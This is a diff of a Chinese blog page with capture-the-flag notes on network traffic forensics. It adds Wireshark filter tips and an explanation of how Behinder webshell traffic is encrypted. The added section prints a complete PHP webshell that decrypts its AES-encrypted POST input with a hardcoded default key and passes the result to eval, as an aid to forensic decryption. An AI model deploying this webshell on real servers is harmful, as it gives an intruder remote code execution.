@@ -20,7 +20,7 @@
 <meta property="og:image" content="https://cauliweak9.github.io/2023/11/21/FlowAnalysis/FA0.png">
 <meta property="og:image" content="https://cauliweak9.github.io/2023/11/21/FlowAnalysis/FA1.png">
 <meta property="article:published_time" content="2023-11-21T10:33:15.000Z">
-<meta property="article:modified_time" content="2023-11-27T15:09:48.850Z">
+<meta property="article:modified_time" content="2023-12-08T14:43:34.407Z">
 <meta property="article:author" content="9C±Void">
 <meta property="article:tag" content="随想">
 <meta property="article:tag" content="流量分析">
@@ -238,7 +238,7 @@
       <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
       <i class="icon-statistics"></i>
       <span class="post-meta-item-text"> 字数统计:</span>
-      <span class="post-count">3.1k字</span>
+      <span class="post-count">3.5k字</span>
     </span>
   </span>
 
@@ -247,7 +247,7 @@
     <span class="post-meta-item-icon">
       <i class="icon-book icon"></i>
       <span class="post-meta-item-text"> 阅读时长≈</span>
-      <span class="post-count">11分</span>
+      <span class="post-count">13分</span>
     </span>
   </span>
 </div>
@@ -290,6 +290,9 @@
 <p>常用于提取异常&#x2F;错误流量包，目前咱比较常用的是_ws.expert.severity和_ws.expert.group，错误包常用_ws.expert.group &#x3D;&#x3D; “Malformed”；severity过滤视具体情况而定，通常”Note”和”Chat”会忽略</p>
 <p>提取异常&#x2F;错误流量包是因为可能题目是在这类流量包里面隐藏了信息，做题的时候可以稍微关注一下左下出现高亮颜色的参数，那个参数可能就是问题所在</p>
 </li>
+<li><p><strong>http.request.method，http.response</strong></p>
+<p>毕竟有很多渗透流量，所以提取出特定方法的请求&amp;响应的流量还是蛮有用的，就比如我想过滤出POST方法的流量，我就直接http.request.method &#x3D;&#x3D; POST，就直接出来了，响应就直接http.response，如果是想过滤出返回特定状态码的话就http.response.code &#x3D;&#x3D; (你需要的状态码) 就行了</p>
+</li>
 </ol>
 <h4 id="一些杂七杂八的要点"><a href="#一些杂七杂八的要点" class="headerlink" title="一些杂七杂八的要点"></a>一些杂七杂八的要点</h4><p>除此之外，跟踪流也是非常好用的一个功能，在上面已选中的流量那里右键，光标移到”追踪流“，然后选择想要追踪的流，之后的弹窗就可以显示所有与选中流量同样流下的流量，非常有利于分析流量</p>
 <p>还有一件事：那些长度较大的流量需要额外关注下，可能这些流量传输了一些重要的文件，这个时候需要观察相对较近的TCP&#x2F;UDP流量中是否也在传输大量的数据，因为可能文件太大，需要分段传输</p>
@@ -314,6 +317,12 @@
 <p>冰蝎最重要的流量特征就是这个<strong>AES128</strong>和这个<strong>$key</strong>，<strong>iv默认是0x0</strong>，但是视情况而定，主要还是看混淆流量里面有没有额外的操作</p>
 <p>接下来就是分析一下冰蝎的流量混淆过程：</p>
 <p>总体上，冰蝎是这样的一个流程：<strong>明文→Base64→AES128→Base64→流量数据</strong>，而解码的时候由于冰蝎是先把马B64然后套个eval再进行接下来的操作的，所以解密的时候最好是开着两个窗口，一个负责先B64解密和AES128解密，另一个把eval里面的马B64解密</p>
+<p>上面的没搞错应该是冰蝎3.0的默认加密，冰蝎还自带一些其它的加密，比如default_aes，default_xor等，这里先把default_aes的shell.php拉出来：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">Decrypt</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="variable">$key</span>=<span class="string">&quot;e45e329feb5d925b&quot;</span>; <span class="comment">//该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond</span></span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">openssl_decrypt</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$data</span>), <span class="string">&quot;AES-128-ECB&quot;</span>, <span class="variable">$key</span>,OPENSSL_PKCS1_PADDING);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="variable">$post</span>=<span class="title function_ invoke__">Decrypt</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>));</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$post</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>和上面的其实差不多，就是这个shell是对上传的参数进行一个Decrypt操作，其中的openssl_decrypt里面的参数就告诉了我们参数是如何加密的（逆推一下就行了）：</p>
+<p>对Base64解密后的$data进行解密后以$key作为key，AES-128-ECB作为加密格式，PKCS1作为Padding进行解密，所以加密就是先AES再Base64，解密就是Base64再AES，和上面其实区别不大，iv也是默认0x0，但是不保证$data里面的东西一定没有Base64，不过各位应该还是能够看出来的吧</p>
+<p>default_xor之类的等之后什么时候再补充</p>
 <h3 id="工控流量"><a href="#工控流量" class="headerlink" title="工控流量"></a>工控流量</h3><p>太久没做了，就只记得一个Modbus，还有一些读写线圈的操作，之后做到相关的题目再补充一下吧，当然欢迎各位扔给我有关工控流量的题目<del>（进行一个坑的挖）</del></p>
 <p><del>（目前手上还有个20W+的工控流量，但是没有明确的flag，等之后有空慢慢看吧இ௰இ）</del></p>
 <h3 id="其它流量"><a href="#其它流量" class="headerlink" title="其它流量"></a>其它流量</h3><p><del>这一部分只是因为咱实在懒得分了www</del></p>
@@ -703,19 +712,15 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">随想</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">Introduction</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">流量分析</a>
+                <a href="javascript:void(0)" class="js-tag color3">随想</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">Hackergame</a>
+                <a href="javascript:void(0)" class="js-tag color5">流量分析</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -724,6 +729,10 @@
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">胡思乱想</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">Hackergame</a>
               </li>
             
             <div class="clearfix"></div>
